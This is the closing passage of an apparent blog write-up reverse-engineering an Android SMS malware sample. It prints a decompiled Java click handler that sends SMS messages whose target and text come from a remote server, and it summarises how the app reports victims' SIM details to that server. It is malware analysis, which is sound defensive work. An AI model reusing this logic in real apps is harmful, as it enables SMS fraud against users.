<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">          findViewById(R.id.button_sensms).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() { <span class="comment">// from class: com.cp.camera.Loading.1</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> {</span><br><span class="line">                    <span class="keyword">if</span> (Build.VERSION.SDK_INT &lt; <span class="number">23</span>) {</span><br><span class="line">                        <span class="keyword">if</span> (Loading.<span class="built_in">this</span>.service != <span class="literal">null</span> &amp;&amp; Loading.<span class="built_in">this</span>.content != <span class="literal">null</span>) {</span><br><span class="line">                            Loading.<span class="built_in">this</span>.sendMessage(Loading.<span class="built_in">this</span>.service, Loading.<span class="built_in">this</span>.content);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        }</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    }</span><br><span class="line">..................................</span><br></pre></td></tr></tbody></table></figure>

<p>Coming back to this code, it actually is a onClick method, which requires user interaction. Looking at the <code>findViewById(R.id.button_sensms</code> seems the button to click. Follow up with the <code>button_sensms</code> </p>
<p><img src="/images/Android%20Malware%20RE%20-%20ThaiCamera/image-20240205231246733.png"></p>
<p>It seems the text is based on the previous server response too. Weird.</p>
<p>Alright anyway the full picture of this malware should be. When the application is started, it will send the victim’s SIM Card details to the remote server, remote server may depends on the victim SIM Card details providing different set of numbers? (Maybe targeting different country) or texts. Then it request for user runtime permission to allow send SMS.</p>  					
					
	  </div>     
	  

	<div class="bottom">
  <div class="other">
    <div class="meta">
      

      
    </div>

    <div class="operate">
      
      <span class="text">Share</span>
      <ul class="share">
	   			             
        <li class="iconfont 
		icon-share-weixin 
		-mob-share-weixin 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weibo 
		-mob-share-weibo 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-facebook 
		-mob-share-facebook 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-twitter 
		-mob-share-twitter 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-google 
		-mob-share-google 
		item"></li>		
   	   
</ul>	

<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
      
    </div>
  </div>


  
  <nav class="nav">
    <div class="link">
      
      <a href="/2024/01/20/HTB-Mobile-Challenge/" class="link-wrap">
        <strong class="caption">older</strong>
        
        <span class="title">
          HTB-Mobile-Challenge
        </span>
      </a>
      
    </div>
    <div class="link">
      
      <a href="/2024/03/24/Sherlock%20-%20Recollection/" class="link-wrap">
        <strong class="caption">newer</strong>
        
        <span class="title">
          Sherlock - Recollection - Easy
        </span>
      </a>
      
    </div>
  </nav>
  
</div> 
	
<div class="comment">

    
    <div id="disqus_thread"></div>
    <script>
        (function () {
            var d = document,
                s = d.createElement('script');
            s.src = 'https://' + 'ik0nw-github-io' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>


    
</div>	
</article>

          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
      

         
            

            <a class="mobile-menu-link" href="/">Home
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">Archives
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">Tags
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">About
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			©
			
			2020 -
			
			2024
			Ikonw

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    
<script src="/nayo.bundle.js"></script>
           
          
</body></html>